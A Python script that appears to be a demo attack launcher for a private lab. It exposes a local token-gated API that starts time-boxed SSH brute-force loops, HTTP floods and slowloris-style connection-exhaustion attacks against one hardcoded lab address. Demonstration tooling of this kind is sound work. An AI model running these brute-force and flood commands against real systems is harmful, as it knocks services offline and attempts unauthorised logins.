#!/usr/bin/env python3
"""Attack launcher for the demo. Runs on the ATTACKER vm.

Exposes a tiny token-gated API to start/stop real attacks against the ONE lab
target. Safety is structural:
  - TARGET is hardcoded. The launcher cannot be pointed at any other address.
  - every attack is time-boxed; it auto-stops after max_seconds.
  - one attack at a time.
  - bound to localhost; token required.

This is a demo tool for a private lab. It intentionally refuses to be general.
"""
import argparse
import json
import os
import shutil
import signal
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# ---- hardcoded lab target. do not make this a parameter. ----
TARGET_IP = "192.168.50.10"
TARGET_URL = f"http://{TARGET_IP}/"
APP_PORT = 8000
APP_URL = f"http://{TARGET_IP}:{APP_PORT}/"
MAX_SECONDS = 30            # every attack auto-stops after this

TOKEN = os.environ.get("AD_DEMO_TOKEN", "")


class Attacker:
    def __init__(self):
        self.proc = None
        self.kind = None
        self.started = 0.0
        self._timer = None
        self._lock = threading.Lock()

    def status(self):
        with self._lock:
            running = self.proc is not None and self.proc.poll() is None
            return {
                "running": running,
                "kind": self.kind if running else None,
                "elapsed": round(time.time() - self.started, 1) if running else 0,
                "target": TARGET_IP,
                "max_seconds": MAX_SECONDS,
            }

    def _cmd(self, kind):
        # each command targets ONLY the hardcoded TARGET. no user input flows in.
        if kind == "bruteforce":
            # many quick failed ssh logins. sshpass required on the attacker.
            inner = (f"for i in $(seq 1 40); do "
                     f"sshpass -p wrong ssh -o PreferredAuthentications=password "
                     f"-o PubkeyAuthentication=no -o StrictHostKeyChecking=no "
                     f"-o ConnectTimeout=2 bad@{TARGET_IP} true 2>/dev/null; done")
            return ["bash", "-c", inner]
        if kind == "request_flood":
            # high-rate http flood from this single source
            return ["ab", "-n", "100000", "-c", "300", "-t", str(MAX_SECONDS), TARGET_URL]
        if kind == "conn_flood":
            # slowloris-style against nginx: many held-open connections
            return ["slowhttptest", "-c", "1500", "-H",
                    "-u", TARGET_URL, "-i", "10", "-r", "500", "-l", str(MAX_SECONDS)]
        if kind == "app_conn_exhaust":
            # connection-exhaustion against the FRAGILE app server: our own
            # hold-open loris reliably occupies the worker pool.
            here = os.path.dirname(os.path.abspath(__file__))
            return ["python3", os.path.join(here, "slowloris_hold.py"),
                    "--host", TARGET_IP, "--port", str(APP_PORT),
                    "--connections", "300", "--seconds", str(MAX_SECONDS)]
        if kind == "app_flood":
            # traffic flood against the fragile app server
            return ["ab", "-n", "100000", "-c", "150", "-t", str(MAX_SECONDS), APP_URL]
        return None

    def _tool_ok(self, kind):
        need = {"bruteforce": "sshpass", "request_flood": "ab",
                "conn_flood": "slowhttptest", "app_conn_exhaust": "python3",
                "app_flood": "ab"}[kind]
        return shutil.which(need) is not None, need

    def start(self, kind):
        with self._lock:
            if self.proc is not None and self.proc.poll() is None:
                return False, f"already running {self.kind}; stop it first"
            cmd = self._cmd(kind)
            if cmd is None:
                return False, f"unknown attack '{kind}'"
            ok, need = self._tool_ok(kind)
            if not ok:
                return False, f"missing tool '{need}'; install it on the attacker"
            self.proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                         stderr=subprocess.DEVNULL,
                                         preexec_fn=os.setsid)
            self.kind = kind
            self.started = time.time()
            # hard stop after MAX_SECONDS no matter what
            self._timer = threading.Timer(MAX_SECONDS, self.stop)
            self._timer.daemon = True
            self._timer.start()
            return True, f"started {kind} against {TARGET_IP} (auto-stops in {MAX_SECONDS}s)"

    def stop(self):
        with self._lock:
            if self._timer:
                self._timer.cancel()
                self._timer = None
            if self.proc is not None:
                try:
                    os.killpg(os.getpgid(self.proc.pid), signal.SIGTERM)
                except Exception:
                    pass
                self.proc = None
                k = self.kind
                self.kind = None
                return True, f"stopped {k}"
            return True, "nothing running"


def make_handler(attacker):
    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _auth_ok(self):
            if not TOKEN:
                return True
            sent = self.headers.get("X-Auth-Token")
            return sent == TOKEN

        def _send(self, code, obj):
            body = json.dumps(obj).encode()
            self.send_response(code)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Headers", "X-Auth-Token,Content-Type")
            self.end_headers()
            self.wfile.write(body)

        def do_OPTIONS(self):
            self._send(200, {"ok": True})

        def do_GET(self):
            if self.path.startswith("/status"):
                return self._send(200, attacker.status())
            self._send(404, {"error": "not found"})

        def do_POST(self):
            if not self._auth_ok():
                return self._send(401, {"error": "unauthorized"})
            n = int(self.headers.get("Content-Length", 0) or 0)
            body = self.rfile.read(n) if n else b"{}"
            try:
                data = json.loads(body or b"{}")
            except json.JSONDecodeError:
                data = {}
            if self.path.startswith("/start"):
                ok, msg = attacker.start(data.get("kind", ""))
                return self._send(200 if ok else 400, {"ok": ok, "message": msg})
            if self.path.startswith("/stop"):
                ok, msg = attacker.stop()
                return self._send(200, {"ok": ok, "message": msg})
            self._send(404, {"error": "not found"})
    return H


def main():
    global TOKEN
    p = argparse.ArgumentParser(description="demo attack launcher (lab target only)")
    p.add_argument("--port", type=int, default=8090)
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--token", default=None)
    args = p.parse_args()
    if args.token:
        TOKEN = args.token

    # refuse to run unless the lab target is reachable (sanity: we're on the lab net)
    attacker = Attacker()
    host = args.host
    if host != "127.0.0.1" and not TOKEN:
        raise SystemExit("refusing to expose the launcher without a token; "
                         "pass --token or set AD_DEMO_TOKEN")
    server = ThreadingHTTPServer((host, args.port), make_handler(attacker))
    print(f"launcher on http://{host}:{args.port}  target={TARGET_IP}  "
          f"token {'set' if TOKEN else 'NONE'}  max={MAX_SECONDS}s", flush=True)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        attacker.stop()


if __name__ == "__main__":
    main()
